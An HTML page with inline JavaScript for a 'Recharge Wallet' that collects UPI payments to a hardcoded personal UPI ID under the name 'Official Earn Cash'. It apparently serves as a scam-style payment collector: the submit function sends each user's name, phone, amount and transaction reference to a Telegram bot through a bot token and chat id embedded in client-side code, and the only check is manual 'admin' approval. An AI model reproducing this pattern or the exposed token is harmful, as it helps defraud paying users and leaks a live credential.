<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Recharge Wallet</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --bg: #0f0f0f; --card: #1a1a1a; --accent: #ffcc00; --text: #ffffff; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
        body { background: var(--bg); color: var(--text); display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 20px; }
        
        .recharge-container { width: 100%; max-width: 400px; background: var(--card); border-radius: 20px; padding: 25px; border: 1px solid #333; box-shadow: 0 15px 35px rgba(0,0,0,0.5); margin-top: 10px; }
        .header { text-align: center; margin-bottom: 20px; }
        .header h2 { color: var(--accent); font-size: 22px; margin-bottom: 5px; }
        .header p { color: #888; font-size: 13px; }

        .amount-box { background: #252525; padding: 15px; border-radius: 15px; text-align: center; margin-bottom: 20px; border: 1px dashed var(--accent); }
        .amount-box span { font-size: 11px; color: #aaa; text-transform: uppercase; }
        .amount-box h1 { font-size: 32px; color: var(--text); margin-top: 5px; }

        /* QR Section */
        .qr-section { background: #fff; padding: 15px; border-radius: 15px; text-align: center; margin-bottom: 15px; }
        .qr-img { width: 180px; height: 180px; border-radius: 10px; margin-bottom: 10px; }
        .btn-download { background: #25d366; color: white; border: none; padding: 8px 15px; border-radius: 8px; font-weight: bold; cursor: pointer; text-decoration: none; display: inline-flex; align-items: center; gap: 5px; font-size: 13px; }

        /* Copy Section */
        .copy-box { background: #000; padding: 12px; border-radius: 12px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; border: 1px solid #333; }
        .copy-box span { color: var(--accent); font-weight: bold; font-size: 14px; }
        .btn-copy { background: var(--accent); color: #000; border: none; padding: 5px 12px; border-radius: 6px; font-weight: 800; cursor: pointer; font-size: 12px; }

        .btn-pay { background: var(--accent); color: #000; width: 100%; padding: 16px; border: none; border-radius: 12px; font-weight: 800; font-size: 16px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; transition: 0.3s; margin-bottom: 15px; }
        
        .utr-box { margin-top: 20px; padding-top: 15px; border-top: 1px solid #333; }
        .utr-box label { display: block; font-size: 11px; color: #aaa; margin-bottom: 10px; text-align: center; }
        input { width: 100%; padding: 15px; border-radius: 12px; border: 1px solid #444; background: #000; color: #fff; font-size: 18px; text-align: center; margin-bottom: 15px; outline: none; }

        .btn-submit { background: #00ff88; color: #000; width: 100%; padding: 14px; border: none; border-radius: 12px; font-weight: 700; font-size: 15px; cursor: pointer; transition: 0.3s; }
    </style>
</head>
<body>

    <div class="recharge-container">
        <div class="header">
            <h2><i class="fa-solid fa-bolt"></i> Recharge Wallet</h2>
            <p>Scan QR or pay using any UPI app</p>
        </div>

        <div class="amount-box">
            <span>Payable Amount</span>
            <h1 id="payAmt">â‚¹ 0</h1>
        </div>

        <div class="qr-section">
            <img src="https://i.ibb.co/gZr0YxVH/Screenshot-20251227-164755.jpg" class="qr-img" alt="Payment QR">
            <br>
            <a href="https://i.ibb.co/gZr0YxVH/Screenshot-20251227-164755.jpg" download="Payment_QR.jpg" class="btn-download">
                <i class="fa-solid fa-download"></i> Download QR
            </a>
        </div>

        <div class="copy-box">
            <span id="upiText">8968146117@ybl</span>
            <button class="btn-copy" onclick="copyUPI()">COPY ID</button>
        </div>

        <button class="btn-pay" onclick="payNow()">
            <i class="fa-solid fa-mobile-screen"></i> DIRECT PAY WITH APP
        </button>

        <div class="utr-box">
            <label>Payment karne ke baad 12-digit UTR yaha dalein</label>
            <input type="number" id="utrInput" placeholder="Enter UTR Number">
            <button id="submitBtn" class="btn-submit" onclick="submitData()">SUBMIT RECHARGE</button>
        </div>
    </div>

    <script>
        const amount = localStorage.getItem('rechargeAmount') || 120;
        document.getElementById('payAmt').innerText = "â‚¹ " + amount;

        function copyUPI() {
            const upi = document.getElementById('upiText').innerText;
            navigator.clipboard.writeText(upi).then(() => {
                alert("UPI ID Copy ho gayi! Ab kisi bhi app mein jaakar pay karein.");
            });
        }

        function payNow() {
            const upiID = "8968146117@ybl";
            const name = "Official Earn Cash";
            const upiUrl = `upi://pay?pa=${upiID}&pn=${encodeURIComponent(name)}&am=${amount}&cu=INR`;
            window.location.href = upiUrl;
        }

        function submitData() {
            const utr = document.getElementById('utrInput').value;
            const name = localStorage.getItem('userName') || 'User';
            const phone = localStorage.getItem('userPhone') || 'N/A';

            if(utr.length < 10) {
                alert("Bhai, sahi UTR number toh dalo!");
                return;
            }

            const btn = document.getElementById('submitBtn');
            btn.innerText = "Processing...";
            btn.disabled = true;

            const token = "7682752151:AAHnHH8fHvNmLoCIAMPlZ_I88esXwy6b53E";
            const chat_id = "8415600127";
            const message = `ðŸ’° *NEW RECHARGE REQUEST*\n\nðŸ‘¤ Name: ${name}\nðŸ“ž Phone: ${phone}\nðŸ’µ Amount: â‚¹${amount}\nðŸ”¢ UTR: ${utr}\nðŸ•’ Time: ${new Date().toLocaleString()}`;

            const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;

            fetch(telegramUrl).then(() => {
                alert("Request Submitted! Admin approve hone ka wait karein.");
                window.location.href = 'home.html'; 
            }).catch(() => {
                window.location.href = 'home.html';
            });
        }
    </script>
</body>
</html>
